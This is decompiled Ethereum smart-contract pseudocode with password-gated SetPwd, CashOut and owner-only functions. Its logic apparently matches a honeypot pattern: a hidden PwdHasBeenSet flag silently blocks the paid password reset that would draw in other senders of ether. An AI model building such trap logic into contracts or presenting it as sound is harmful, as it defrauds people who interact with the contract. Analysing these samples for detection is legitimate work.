contract main {




// =====================  Runtime code  =====================


uint256 stor0;
uint8 stor1;
uint256 stor2;
address stor3;
address stor4;

function _fallback() payable {
  stop
}

function Setmyadress(address arg1) {
    if msg.sender == stor3:
        stor4 = arg1
}

function SetcashOutTime(uint256 arg1) {
    if msg.sender == stor3:
        stor2 = arg1
}

function PwdHasBeenSet(bytes32 arg1) {
    if arg1 == stor0:
        if msg.sender == stor3:
            stor1 = 1
}

function CashOut() payable {
    if msg.sender == stor4:
        if block.timestamp > stor2:
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
}

function CashOut(bytes arg1) payable {
    if stor0 == sha3(arg1[all]):
        if block.timestamp > stor2:
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
}

function SetPwd(bytes32 arg1) payable {
    if stor1:
        if not stor0:
            stor0 = arg1
            stor3 = msg.sender
            stor2 = block.timestamp
    else:
        if msg.value > 10^18:
            stor0 = arg1
            stor3 = msg.sender
            stor2 = block.timestamp
        else:
            if not stor0:
                stor0 = arg1
                stor3 = msg.sender
                stor2 = block.timestamp
}

function DebugHash(bytes arg1) {
    mem[128 len arg1.length] = arg1[all]
    mem[ceil32(arg1.length) + 128 len floor32(arg1.length)] = call.data[arg1 + 36 len floor32(arg1.length)]
    mem[ceil32(arg1.length) + floor32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32] = mem[-(arg1.length % 32) + floor32(arg1.length) + 160 len arg1.length % 32]
    mem[ceil32(arg1.length) + 128] = sha3(call.data[arg1 + 36 len floor32(arg1.length)], mem[ceil32(arg1.length) + floor32(arg1.length) + 128 len arg1.length % 32])
    return memory
      from ceil32(arg1.length) + 128
       len 32
}



}
